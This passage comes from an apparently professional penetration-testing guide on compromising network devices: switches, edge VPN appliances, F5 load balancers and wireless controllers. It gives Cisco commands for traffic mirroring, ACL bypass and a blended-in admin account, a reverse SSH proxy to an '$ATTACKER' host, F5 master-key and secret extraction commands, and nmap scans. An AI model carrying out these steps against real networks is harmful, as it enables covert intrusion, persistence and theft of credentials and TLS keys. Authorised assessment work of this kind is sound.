**Preconditions.** Administrative access to the switch. A physical port to mirror to, and physical access to plug into it, for local SPAN. For remote capture you need ERSPAN support, which encapsulates the mirrored traffic in GRE and sends it to an arbitrary IP destination, which means you can receive it anywhere you can be reached, and RSPAN, which carries it in a dedicated VLAN across trunks. ERSPAN is the one you want and it is available on many but not all platforms.

```text
! Cisco IOS local SPAN: mirror one access port to a port you are plugged into.
monitor session 1 source interface GigabitEthernet1/0/5 both
monitor session 1 destination interface GigabitEthernet1/0/24

! Mirror an entire VLAN instead.
monitor session 1 source vlan 20 rx
monitor session 1 destination interface GigabitEthernet1/0/24

! Verify, then remove when finished.
show monitor session 1
no monitor session 1
```

```text
! ERSPAN source session: encapsulate in GRE to a remote collector.
! Platform support and exact sub-commands vary considerably by
! platform and train; check the configuration guide for your target.
monitor session 2 type erspan-source
 source interface GigabitEthernet1/0/5 both
 destination
  erspan-id 101
  ip address 10.20.30.99
  origin ip address 10.20.30.1
 no shutdown
```

<!-- VERIFY: ERSPAN configuration syntax differs materially between IOS, IOS-XE, NX-OS and IOS-XR, and between platforms within a train. Confirm against the configuration guide for the exact platform before use. The local SPAN form above is stable across IOS and IOS-XE. -->

**Verify it worked.** `show monitor session` reports the session state, its sources and its destination. On your capture interface, traffic appears immediately and it is traffic you are not a party to, which is the confirmation you want. Check the volume against expectation: a mirrored server VLAN produces a great deal of traffic and a trickle means your source specification is wrong.

**Disruption risk: low but not zero, and the risks are specific.** A destination port in a monitor session stops participating in normal switching, so if you mirror to a port that had something plugged into it, you have just disconnected that device. Choose a port you have confirmed is unused, or accept that consequence knowingly. Mirroring a very high-throughput source to a lower-capacity destination port causes the mirrored copy to be dropped, which does not affect production traffic but does mean your capture is incomplete and you may not realise it. On some platforms there is a limit on the number of concurrent sessions, and creating yours may fail or, worse, may require removing an existing session that a monitoring or IDS system depends on: check `show monitor session all` first and never remove a session you did not create, because a network IDS silently losing its feed is both a control failure you caused and a very awkward conversation. ERSPAN adds GRE-encapsulated traffic volume to the network between the switch and your collector, which on a constrained link is a genuine capacity concern.

**Detection and opsec.** The monitor session is a configuration change and it will appear in a configuration diff, which is the detection that actually catches this, and it is a detection many organisations have. It appears in command accounting if TACACS+ is in use. `show monitor session` will show it to any engineer who looks. ERSPAN generates a new GRE flow from a switch to an unusual destination, which is visible in flow data and is anomalous. Remove the session when you are done, both because leaving it is untidy and because a forgotten mirror session is a real security weakness you would report as a finding if you found it.

**Failure modes.**

- Session creates but no traffic appears: the source specification is wrong, or the direction keyword excludes what you wanted, or the destination port is administratively down. Check `show monitor session` for the state and check the interface counters on the destination.
- Command rejected with a limit error: the platform's maximum number of sessions is already used.
- Command rejected on the destination: some platforms will not allow a destination port that is a member of a VLAN, or that is a trunk, or that has certain features configured. Clear the port's configuration first, which is itself a change.
- Traffic appears but is only in one direction: you specified `rx` or `tx` rather than `both`.
- Capture is full of gaps under load: the destination port is oversubscribed relative to the source. Narrow the source.

### Adding routes

**What it is.** Inserting a static route so that traffic for a destination is delivered somewhere you control, or so that a network unreachable from your position becomes reachable.

**Why it works.** Forwarding follows the routing table, most-specific match first. A more specific static route than the existing entry wins. On the device you control, this changes where traffic goes.

**What it gets you.** Two distinct uses. Reaching a segment you could not reach, by adding a route on a device that has connectivity to both, which is a pivot implemented in the network rather than in a tunnel. And redirecting traffic for a specific destination through a host you control, which is an on-path position at layer 3 with none of the layer 2 mess.

**Disruption risk: high, and worse than it looks.** A static route more specific than the correct one silently blackholes traffic for that destination if the next hop does not actually forward it, and the failure presents to users as "the application is down" with no obvious cause. Redistributing a static route into a routing protocol, which happens automatically in some configurations, propagates your change across the entire network and can take down connectivity at sites you have never seen. A route that overlaps with an existing summarised advertisement can produce a routing loop. This is the single most dangerous category of change in this section and it should not be made without agreement, without a documented revert, and without a timed rollback armed.

Prefer, wherever it is possible, to achieve reachability with a tunnel or a proxy on a host rather than by modifying a routing table, because a host-level tunnel affects only that host and reverts when you kill the process. The tunnelling and pivoting material in the Lateral Movement section covers those primitives and they are almost always the better answer. Reserve routing changes for cases where there is genuinely no host in the path to work from.

### Modifying access control lists to defeat segmentation

**What it is.** Adding a permit entry, or removing or reordering a deny, so that traffic you want is allowed across a boundary that was blocking it.

**Why it works.** ACLs are ordered lists evaluated first-match. Inserting a permit above the relevant deny changes the outcome for the traffic you specify and nothing else.

**What it gets you.** The segmentation boundary, on your terms. This is also how you demonstrate the impact of device compromise in a report: the fact that you could reach the isolated network is much less compelling than the fact that you could remove the isolation for anyone, at will, from a device that nobody was monitoring.

**How to do it with the least risk.** Be as specific as you possibly can. Permit exactly your source address to exactly the destination and port you need, inserted at a specific sequence number above the relevant deny, and remove it by sequence number when you are finished. Do not append a broad permit, do not remove a deny, and do not reorder existing entries. Named ACLs with sequence numbers make an insert and a removal into surgical single-line operations, which is exactly what you want.

```text
! Insert a narrow permit at a specific sequence number in a named ACL.
ip access-list extended SEGMENT-IN
 15 permit tcp host 10.10.10.50 host 10.99.99.10 eq 443
!
! Remove it by sequence number afterwards. This is the whole revert.
ip access-list extended SEGMENT-IN
 no 15
```

**Disruption risk: moderate for an insert, severe for anything else.** A narrow insert at a free sequence number is close to harmless. Everything else is not. Overwriting an existing sequence number replaces a rule and you may not notice what you replaced. Reapplying an entire ACL, which is what happens if you paste a whole named ACL definition, momentarily leaves the interface with a partial or empty ACL, and on some platforms with an implicit deny, which drops production traffic for the duration of your paste. Removing an ACL from an interface to work around a problem opens the boundary for everyone. And the specific catastrophic case: applying an ACL to the management interface or the VTY lines that does not include your own source address locks you out of the device entirely, which is why the timed rollback matters.

**Detection.** ACL changes are the most commonly monitored configuration change there is, because they are the ones that matter for compliance. Organisations that monitor nothing else about their network devices frequently do monitor firewall and ACL changes, sometimes with a same-day review process, because an auditor asked them to. Assume an ACL change will be seen.

### Creating tunnels

**What it is.** Configuring a GRE, IPsec or VXLAN tunnel from the device to a host you control, so that the device becomes a network-level entry point into whatever it can reach.

**Why it works.** A tunnel interface is a normal routed interface once it is up. Traffic routed into it emerges at the other end. A device with a tunnel to your infrastructure and a route pointing into it is a permanent, protocol-legitimate path from your position into the network segments that device serves.

**What it gets you.** A pivot that is part of the network rather than part of a compromised host, so it does not depend on any host staying up, does not appear in any process list, and survives reboots of everything except the device itself. It is also the most durable form of the reconfiguration-as-persistence idea discussed below.

**Disruption risk: moderate, and mostly indirect.** The tunnel itself does not disturb existing traffic. What disturbs traffic is the routing you have to add to make it useful, which puts you back in the routing risk category above. Also consider MTU: traffic routed into a tunnel is encapsulated and therefore has a lower effective MTU, and where path MTU discovery is broken, which it very often is, the result is that large packets are silently dropped and applications fail in confusing ways. If you route production traffic into a tunnel you will cause this.

**Detection.** A new tunnel interface is a conspicuous configuration change. The tunnel's outer flow is a persistent GRE or IPsec session from a network device to an external or unusual internal address, which is exactly the shape of traffic that flow-based detection is good at. This is a high-signal artefact and it is the sort of thing that is found during an incident investigation even if it is missed in real time.

### Enabling management access

**What it is.** Turning on a management service, widening a management access list, or adding your address to the permitted management sources, so that you can reach the device from where you actually are.

**Why you need it.** Frequently you obtain credentials from a configuration but cannot use them, because the device's management plane is restricted to the management network. Adding your source address to the relevant access list, or enabling SSH where only console access exists, converts a credential into access.

**Disruption risk: low, but the exposure risk is high.** Enabling an unauthenticated or weakly authenticated service on a production device, most notably the HTTP server on a Cisco device given the history of that specific component, creates real exposure that outlasts your engagement if you forget to remove it. Widening a management ACL is a small change with a large security consequence. Track every such change explicitly and revert every one.

**Detection.** A change to the management ACL or to the enabled service set is a configuration diff and is among the changes most likely to be reviewed, because it is a change to the device's own security posture. Some management platforms specifically alert on management plane changes.

### Adding accounts

**What it is.** Creating a local administrative account on the device.

**Why you might.** Because the account you compromised is centrally authenticated and may be disabled, because you want access that survives the AAA server being unavailable, or because you need a credential for automated collection across a fleet.

**Why you should hesitate.** A new local account is the single most detectable configuration change on a network device, and it is the one that configuration monitoring is most reliably tuned to catch, because it is the exact artefact of the publicly documented mass exploitation campaigns against network devices. If the organisation has any detection at all on device configurations, it has detection on new local users. It is also the change most likely to be caught by a human, because engineers read the user list.

If you do it, name the account to blend with the existing naming convention rather than choosing something anonymous like `admin` or `support`, which stand out precisely because they are what an attacker would choose. Record it and remove it. Prefer, where the platform supports it, adding an SSH public key to an existing service account over creating a new account, because it is a smaller diff in a less-examined part of the configuration. And prefer, above both, not needing device persistence at all: if you can reach the configuration archive or the management platform, you have durable access to the fleet without touching a single device.

```text
! IOS. Use the strongest available hash type, both because a weak one
! is a finding against you and because type 9 resists offline attack
! if the configuration leaks.
username svc-netmon privilege 15 algorithm-type scrypt secret <password>
```

### Change and risk summary

| Change | What it gets you | Disruption risk | Detection likelihood | Revert |
| --- | --- | --- | --- | --- |
| Read configuration | Everything in the mining section | None | Low, unless command accounting | n/a |
| SPAN or mirror session | Full traffic for a port or VLAN | Low: destination port goes offline, session limits | Moderate: configuration diff | Single line |
| ERSPAN session | Remote traffic capture | Low to moderate: added link load | Moderate to high: anomalous GRE flow | Single stanza |
| Insert narrow ACL permit | Cross a segmentation boundary | Low if inserted by sequence number | High: ACL changes are watched | Remove by sequence number |
| Remove or reorder ACL entries | Broader access | High | High | Restore original ACL |
| Add static route | Reachability or redirection | High: blackholes, loops, redistribution | Moderate | Remove route, if you still have access |
| Create tunnel | Durable network-level pivot | Moderate: MTU, plus routing risk | High: persistent anomalous flow | Remove interface |
| Widen management ACL | Use credentials from your position | Low | High: security posture change | Remove entry |
| Enable a management service | Reachability | Low, exposure high | High | Disable service |
| Add local account | Persistence | Low | Very high | Remove account |
| Interface shutdown or VLAN change | Rarely useful offensively | Severe | Certain | Restore, but the outage happened |
| Device reload | Recovery from your own mistake | Severe | Certain | Nothing to revert, the outage is the event |

## Firewalls, VPN Concentrators and Edge Devices

### Why they are perennially exploited

Edge appliances have been the leading initial access vector for serious intrusions for several years, and the reasons are structural rather than accidental.

They are internet-facing by definition, so there is no perimeter in front of them. They terminate authentication for remote users, so they must expose a complex, unauthenticated, feature-rich web application to the entire internet. They run large proprietary software stacks, frequently a customised Linux with vendor daemons written in C or in a scripting language shelling out to C, and that code has had far less adversarial attention than a mainstream web stack until the moment it gets a lot of it. They cannot run endpoint detection, so post-exploitation on the appliance itself is unobserved. They are hard to patch, because patching the VPN concentrator disconnects every remote worker, so patches wait for a window. And they are trusted by everything behind them, because the whole point of the device is to be the trusted terminus of remote access, which means a foothold on the appliance is a foothold in a privileged network position.

The combination is close to ideal for an attacker: unauthenticated reachability, complex attack surface, no telemetry, slow patching, and a privileged position. It is why the same small set of vendors appear in exploitation reporting over and over, and it is why an edge appliance running firmware more than a few months behind should be treated as a probable route in rather than a low-priority finding.

### The vulnerability classes that recur

Rather than a CVE list, which ages badly, these are the classes. Every one of them has occurred multiple times across multiple vendors and will occur again.

**Pre-authentication path or authorisation bypass.** The web server routes a request to a handler, and a separate component decides whether the request needed authentication. Where those two disagree, you get a bypass. Common shapes: a path prefix or suffix that the authorisation layer treats as a static asset and the handler treats as an API call; path traversal or normalisation differences between the two components; an endpoint added to the handler table and never added to the authorisation table. The Ivanti Connect Secure chain of CVE-2023-46805, an authentication bypass in the web component, with CVE-2024-21887, a command injection, is the archetype: neither is enough alone, and together they are unauthenticated root.

**Command injection in a management or diagnostic handler.** Appliance management interfaces expose diagnostic functions, ping, traceroute, log collection, certificate import, backup and restore, and those functions shell out. User-controlled input reaching a shell in a daemon running as root is the most common single root cause of appliance remote code execution.

**Memory disclosure leaking session material.** A buffer over-read in a request handler returns adjacent heap memory, which contains other users' session tokens. The token is then used directly, bypassing authentication and multi-factor authentication alike, because the session already completed both. The NetScaler issue CVE-2023-4966, widely called Citrix Bleed, is the canonical example: a crafted request returned memory contents including valid session tokens, and possession of a token was equivalent to an authenticated session with MFA already satisfied. This class is particularly damaging because MFA does not help and because the artefact left behind is a legitimate authenticated session, which is very hard to distinguish from a real user.

**File read through the VPN portal.** SSL VPN portals serve files and have historically served the wrong ones. A path traversal in a portal handler that reads the session database or a configuration file yields credentials or session material without authentication.

**Deserialisation and template injection in management applications.** Appliance management consoles and their central management counterparts, meaning the Panorama, FortiManager, ISE and equivalent tiers, are large web applications and carry the vulnerability classes of large web applications, including insecure deserialisation and server-side template injection.

**Weak or absent authentication on the device-to-manager channel.** The protocol between a managed device and its central manager is a trusted channel with its own authentication, and that authentication has historically been weaker than the management interface's. A position on that channel or a flaw in it yields control of every managed device.

**Post-patch persistence.** This is a class in its own right and it is the reason patching an exploited appliance is not remediation. Because appliances have writable filesystems and startup scripts, an attacker who achieved code execution before the patch frequently retains access after it. Where you have compromised an appliance, expect the client's remediation to be a patch, and where you are assessing an incident, expect the implant to survive.

### Credential and session material on a compromised device

Once you have code execution or an administrative shell on an edge device, it is a credential trove of a very specific and valuable kind, because unlike a workstation it holds credentials for many users rather than one.

**Active VPN session material.** The session database or in-memory session table for every currently connected remote user. Session cookies, tokens and, on some platforms, cached credentials. These are live and usable immediately.

**Cached and stored authentication credentials.** The service account the appliance uses to bind to LDAP or Active Directory, which is a domain credential, present in the configuration in a reversible form because the appliance must present it to the directory. This is very frequently the highest-value single item on the device, and it is why an SSL VPN compromise so often becomes a domain compromise within the hour.

**Local administrative accounts.** In the hash and reversible formats tabulated earlier.

**RADIUS and TACACS+ shared secrets.** As everywhere.

**Certificates and private keys.** The TLS certificate and private key for the VPN portal, which is a publicly trusted certificate for a hostname the organisation's users trust, and often the private key for a certificate authority used to issue client certificates. A client certificate CA key means you can issue yourself a valid client certificate, which defeats certificate-based authentication entirely.

**IPsec pre-shared keys and the peer inventory.** Every site-to-site tunnel and every partner connection.

**The full firewall rule base.** Which is the segmentation policy for the perimeter, in its entirety, including the exceptions.

**Configuration backups.** Appliances keep local configuration backups, and those backups contain the secrets from before the last rotation.

### Pivoting from the edge device inward

An edge device is a superb pivot and a poor one, for different reasons, and understanding both shapes your approach.

Superb, because it sits in a privileged network position with routes into internal networks by design, because it terminates VPN traffic and therefore has legitimate reason to talk to internal servers, because it is not running endpoint detection, and because traffic from it to internal hosts is expected and unremarkable.

Poor, because it is an embedded appliance with a restricted shell, limited tooling, limited writable space, an architecture that may not be x86, and a filesystem that may be reset by a firmware upgrade. You will not be running your usual toolkit on it.

The practical approach is to use it as a network transit rather than as an execution platform. Get a tunnel or a SOCKS proxy through it and do your work from your own machine, using the tunnelling primitives in the Lateral Movement section. In order of preference: if the appliance has a usable SSH client or server, use SSH dynamic forwarding, which requires nothing to be uploaded. If it has a full shell and a writable directory, upload a small static reverse SOCKS agent built for the right architecture. If it has neither, use the appliance's own features: a firewall can be configured to forward a port, a VPN concentrator can be configured to give a client a route into a network it otherwise would not reach, and a device with a scriptable API can often be made to make requests on your behalf.

```bash
# Cleanest option where the appliance has an SSH client: dynamic forward
# outward from the appliance to your host, then use it as a SOCKS proxy.
ssh -R 1080 $ATTACKER   # from the appliance, if it has a client

# Or inward, if you can reach its SSH server with credentials.
ssh -D 1080 -N $USER@$TARGET
```

Note the appliance-specific option that has no equivalent elsewhere: reconfiguring the VPN concentrator to grant a VPN client, namely you with a credential you found, broader internal access than the policy intends. That is a configuration change and carries the usual risks, but it produces a fully routed position inside the network from a legitimate remote access session, which is both an excellent operational position and an extremely clear demonstration of impact.

**Detection and opsec on a compromised appliance.** Appliance logs are typically forwarded to a SIEM, and appliance vendors publish indicator guidance after each exploitation wave, so the specific artefacts of publicly known exploitation are increasingly well covered. What is much less covered is anything you do that looks like normal appliance behaviour. Sessions, configuration reads and internal connections from the appliance are all ordinary. Writing files to unusual paths, spawning shells, and outbound connections from the appliance to the internet are not, and outbound connections are the one most likely to be caught, because appliances have a small and predictable set of destinations they normally contact: update servers, licensing, DNS, NTP, the AAA server and the management platform. Anything else stands out in flow data. Also note that on several platforms a vendor-provided integrity checking tool exists and is run during incident response, so filesystem modifications are discoverable after the fact even when they are not detected live.

## Load Balancers and Reverse Proxies

### What they hold

Load balancers are the most under-appreciated high-value target in the estate, because they hold three things that nothing else holds together.

**TLS private keys, in quantity.** A load balancer terminating TLS holds the private key for every hostname it fronts. On a busy device that is dozens or hundreds of keys, including publicly trusted certificates for the organisation's main web presence and wildcard certificates that cover everything in a domain. A wildcard private key is a passive decryption capability against any captured traffic for that domain that used a non-forward-secret cipher suite, and an impersonation capability against everything in the domain. It is also very difficult to remediate, because rotating a wildcard certificate means touching everything that uses it.

**The complete backend topology.** The load balancer configuration lists every backend pool, every member of every pool with its real internal address and port, the health check for each, and the routing logic that maps external hostnames and paths to internal services. This is a complete inventory of the organisation's internal application estate with addresses, and it is the definitive answer to "what is actually behind this". Health check definitions are a bonus: they frequently contain the exact URL, and sometimes the credentials, needed to reach an application's status endpoint.

**Credentials, more often than you would expect.** Load balancers do work that requires secrets: they authenticate to backends, they perform LDAP or RADIUS lookups for access policies, they inject authentication headers, they hold API keys for integrations, and they run scripts. On F5 in particular, iRules and Access Policy Manager configurations contain application logic including, with some regularity, embedded credentials and tokens.

Beyond those three: the ability to inject content into any application the device fronts, by modifying the response path, which is a route to compromising users of an internal application; the ability to redirect traffic for a hostname to a backend you control; and, because the device sits in the traffic path for the applications that matter, an excellent capture position.

### F5 BIG-IP specifics

BIG-IP is worth treating specifically because it is very widely deployed, because it has been the subject of repeated serious pre-authentication vulnerabilities in its management interfaces, and because its secret storage has a well-documented structure.

The management surfaces are the TMUI web interface, the iControl REST API, SSH to the TMOS shell, and, on the underlying system, a normal Linux with a root account. The recurring vulnerability classes are exactly the appliance classes above: authorisation bypasses in iControl REST where the request routing and the authentication decision disagree, and pre-authentication code execution in TMUI. Treat any BIG-IP whose management interface is reachable and whose version is behind as a likely compromise.

Once you have root on the device, the configuration and secret layout is stable. Configuration lives in `/config`, principally `bigip.conf` for objects and `bigip_user.conf` for administrative users. Secrets in those files are stored encrypted under a per-unit master key, and the master key is retrievable on the device with the `f5mku` utility, which means secrets are recoverable with root access but not from a configuration file alone. A UCS archive, the device's own backup format, bundles the configuration and, depending on how it was created, the key material, which makes a UCS archive found on a file share or a backup server a very high-value artefact.

```bash
# On the device with root: retrieve the master key, then use it to
# decrypt the $M$ values found in bigip.conf and bigip_user.conf.
f5mku -K

# Locate the secrets and the certificate material.
grep -rn 'passphrase\|\$M\$\|secret' /config/bigip.conf /config/bigip_user.conf
ls -la /config/ssl/ssl.key/ /config/ssl/ssl.crt/

# The device's own backup bundles the configuration.
tmsh save /sys ucs /var/tmp/backup.ucs
```

<!-- VERIFY: the exact decryption invocation for $M$ values using the output of f5mku -K. The mechanism, encryption under the unit master key retrievable with f5mku, is documented; the specific openssl command line varies with the cipher and encoding used and should be confirmed against current research before relying on it. -->

The certificate and key directories are the real prize. `/config/ssl/ssl.key/` contains the private keys for everything the device terminates, in PEM form, readable as root.

### Management interfaces on load balancers and reverse proxies

The pattern generalises. Every device in this class, whether it is a hardware load balancer, a software reverse proxy, an API gateway or an ingress controller, has an administrative interface, that interface is a web application or an API, and it is the attack surface. Additional considerations specific to the class:

The management interface is often on a dedicated interface and network, which means finding it requires enumerating the management network rather than the service network. A load balancer's service addresses answer on 443 with an application; its management address answers on 443 with an administrative UI, and those are different addresses.

Reverse proxies and API gateways increasingly hold OAuth and OIDC client secrets and JWT signing keys, because they perform token validation and sometimes token issuance at the edge. A JWT signing key from an API gateway is the ability to mint valid tokens for any user of every application behind it, which is a complete authentication bypass for those applications and is not fixed by rotating any user's password. Look for it explicitly.

Software load balancers and ingress controllers running in Kubernetes hold their TLS material in cluster secrets, which changes the target from the device to the cluster and is covered in the containers and orchestration material in the Linux Post-Exploitation section.

## Wireless Controllers

The radio-side attacks, evil twin, PMKID and handshake capture, EAP relay, WPA3 and the 802.1X client validation problem, are in the On-Path and Traffic Attacks section. What follows treats the controller as a device.

**What it is.** A wireless LAN controller is the brain of an enterprise wireless deployment: it holds the entire wireless configuration, terminates the tunnels from every access point, and in most architectures forwards all client traffic. Cisco's controllers and embedded wireless controllers, Aruba's mobility controllers and Mobility Conductor, Ruckus SmartZone, and the cloud-managed equivalents, Meraki, Aruba Central and Mist, all fill the same role. In the cloud-managed cases the controller is a SaaS tenancy, which moves the target from a device on the network to a cloud identity, and the Cloud and Modern Identity section is the relevant reference for attacking that.

**Why the controller is the target rather than the radio.** Every radio attack gets you one thing: access to one SSID, or one user's credential. The controller gets you all of it at once, without transmitting anything. Its configuration contains the pre-shared key for every WPA2-Personal SSID, the RADIUS servers and shared secrets for every 802.1X SSID, the SSID to VLAN mapping for the whole estate, the guest network configuration and any guest credentials, the management credentials, and the complete AP inventory with locations. It also contains the wireless intrusion detection configuration, which tells you exactly what the wireless side is watching for, which is directly useful if you intend to do any radio work afterwards.

**How you reach it.** Standard device management surfaces: SSH, the web UI, SNMP, and the vendor API. ArubaOS controllers use TCP 4343 for the web UI in addition to 443, and 8211 UDP for the PAPI control channel to access points. Cisco controllers use 443 and 22 for management with CAPWAP on UDP 5246 and 5247 to the APs. The controller is normally on the management network, which is the usual access problem.

```bash
nmap -p 22,23,80,443,4343,8443 -sV $TARGET
nmap -sU -p 161,5246,5247,8211 $TARGET
```

**The access point as a route to the controller.** This is the technique specific to this device class and it is worth knowing. Access points are physically accessible in ways controllers are not: they are on ceilings in corridors, in reception areas, in car parks, and in warehouses, often secured with a screw.
